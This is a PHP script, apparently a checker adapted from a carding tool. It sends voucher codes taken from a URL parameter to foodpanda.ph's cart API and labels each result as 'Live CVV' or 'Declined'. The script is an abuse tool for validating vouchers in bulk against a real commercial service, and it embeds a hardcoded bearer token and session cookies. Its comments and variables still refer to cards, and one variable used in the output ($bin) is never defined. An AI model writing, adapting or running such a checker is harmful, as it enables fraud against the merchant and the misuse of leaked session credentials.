<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Bangkok');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$voucher = multiexplode(array(":", "|", ""), $lista)[0];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.foodpanda.ph/cart/calculateAPI');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.foodpanda.ph',
'cookie: token=eyJhbGciOiJSUzI1NiIsImtpZCI6InZvbG8iLCJ0eXAiOiJKV1QifQ.eyJpZCI6InQ2MTB2Nm1ieHdud3Z6Z3ZzMzVqbTdsYmY4bHBuZ3A0cDhndTBpbGsiLCJjbGllbnRfaWQiOiJ2b2xvIiwidXNlcl9pZCI6InBodGZwMTJ3IiwiZXhwaXJlcyI6MTYzNTc1ODgyMCwidG9rZW5fdHlwZSI6ImJlYXJlciIsInNjb3BlIjoiQVBJX0NVU1RPTUVSIEFQSV9SRUdJU1RFUkVEX0NVU1RPTUVSIn0.vTKbMcFZcDmb0avsicmS2_OMJ3pxE8J4p47qQFiqNf5w611JwltthxDPNj6HGBtNvmjDbCdax7Bm-jwxpF6b-uOeyvTQtLat5GLXlhmplLsE74a06h37E2p-evKgtYwexfMvsOijlhf-p4EUzX-qilCPXr0IwCdJ572mWrQfQqWtKS-QACswC14qF6EMc_3da_GjyLlGij7AhvuHF3hZ4FCPtKFodLcRVB8_30swKySF564aHtGOz5p1irJh1-eCCOSzYPuk8CkgCb9CkzrLjH4g6itVtVzTQiMgMsLkCbTlAyrisVhfraFNYYAabpMv73wGED8zGidOnwOmY1WCIQ; userSource=volo; __cfduid=d6bac2e9de1b181e8cbf2f0640d98b5001611671044; dhhPerseusGuestId=1611671044.6101490218.Gavy8XlY8m; AppVersion=9054eef; hl=en; dhhPerseusSessionId=1611995977.1971515240.Xb8m4iJwid; ld_key=phtfp12w; dps-session-id=10.2875953_123.8669711_1611671044.6101490218.Gavy8XlY8m_1611995990_1611997790; __cf_bm=947035550d022f1b984305b343cc5003ea568751-1611997578-1800-AUI50VZ7tpUOILaPEabHcKqL2OnGNOoxny8duG1hqzVnG/9VdiYf3NhiFMsNiuiz+xpUR9SyNOSeR7J2KlT0pCo=; PHPSESSID=95a01c313cb554b14ee356224e227149; dhhPerseusHitId=1611997665728.678909714801942500.enr39b6wy6',
'dps-session-id: eyJzZXNzaW9uX2lkIjoiMzVhODkxNTNmZTMxNmM5NzRmOTBmZTllMGQ5NjIwZGUiLCJwZXJzZXVzX2lkIjoiMTYxMTY3MTA0NC42MTAxNDkwMjE4Lkdhdnk4WGxZOG0iLCJ0aW1lc3RhbXAiOjE2MTE5OTU5OTB9',
'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://www.foodpanda.ph',
'Referer: https://www.foodpanda.ph/checkout/q9el/payment?expedition_type=delivery',
'Connection: keep-alive',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'x-newrelic-id: XQUBUFZADgUGU1VQAgk=',
'x-pd-language-id: 1',
'x-requested-with: XMLHttpRequest',
    ));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payload":{"auto_apply_voucher":false,"expedition":{"type":"delivery","latitude":10.2875953,"longitude":123.8669711,"rider_tip":{"type":"amount","amount":0}},"order_time":"2021-01-30T17:08:13+08:00","products":[{"price":109,"id":8276341,"original_price":109,"quantity":4,"special_instructions":"","toppings":[],"variation_id":9879438,"variation_name":"Go Coke 1.5L","sold_out_option":"REFUND","vat_percentage":null,"menu_id":69171,"menu_category_id":531883,"packaging_charge":0,"code":"920c928b-7ab2-4160-8394-24f767b0080c","menu_category_code":"s7dk-mc-85dq","variation_code":"77899615-1bf9-43f3-b5f3-4294b9bba245"}],"vendor":{"code":"v5le","latitude":10.2902359,"longitude":123.8706387,"marketplace":false,"vertical":"restaurants"},"dynamic_pricing":0,"payment":{"type_id":1,"methods":[{"method":"payment_on_delivery","amount":485}],"method":"payment_on_delivery"},"voucher":"'.$voucher.'"},"include":["expedition","timepicker"]}');

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 

//echo $result;
////////////////////////////===[Card Response]
$message = trim(strip_tags(getstr($result,'"message":"','"')));
$api_dead = "API DEAD";
//echo $message;

$msg_end = '';
$message_app = '<span class="badge badge-success">Live CVV</span>  '.$lista.'  <b>'.$message.'</b>';
//$message_app2 = '<span class="badge badge-success">Live CNN</span> '.$lista.' <b>'.$message.'</b>';
$message_dec = '<small>" '.$lista.' "  '.$message.'</small>';
$message_dead_api = '<span class="badge badge-danger">Declined</span>  '.$lista.'  <b>'.$api_dead.'</b>';



if(strpos($result, 'CVV2 MATCHED') !== false) {
  echo '<b>#LIVE: </b>  '.$lista.'  <b>'.$bin.'</b>';
} elseif(strpos($result, 'CVV2 DECLINED') !== false) {
  echo $message_dec;
} elseif(strpos($result, 'LIVE') !== false) {
  echo $message_app;
} elseif(strpos($result, 'MISSING') !== false) {
  echo $message_dead_api; 
}
  else {
  echo $message_dec;
}
?>